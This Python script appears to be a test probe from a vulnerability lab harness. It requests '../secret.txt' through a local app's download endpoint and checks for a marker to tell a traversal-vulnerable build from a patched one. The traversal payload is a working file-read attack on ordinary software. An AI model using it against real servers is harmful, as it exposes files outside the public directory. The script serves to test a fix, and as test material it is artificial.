#!/usr/bin/env python3
"""Probe for traversal-file-download.

Requests the secret file (which lives OUTSIDE the app's public directory)
via a ../ traversal in the download endpoint's name parameter. Exits 0
iff the secret's marker is observed in the response -- i.e. the traversal
succeeded. Exits 1 otherwise (the patched variant confines downloads to
the public directory and refuses the request).
"""
import os
import time
import urllib.error
import urllib.parse
import urllib.request

MARKER = "FNDRY-TRAV-9E4B71"
TRAVERSAL_NAME = "../secret.txt"


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "foundry-probe"})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", "replace")


def main():
    base = os.environ.get("BASE_URL", "http://127.0.0.1:18080").rstrip("/")
    url = base + "/get?" + urllib.parse.urlencode({"file": TRAVERSAL_NAME})
    try:
        body = fetch(url)
    except Exception:
        time.sleep(0.5)  # one retry for startup races
        try:
            body = fetch(url)
        except Exception:
            return 1
    return 0 if MARKER in body else 1


if __name__ == "__main__":
    raise SystemExit(main())
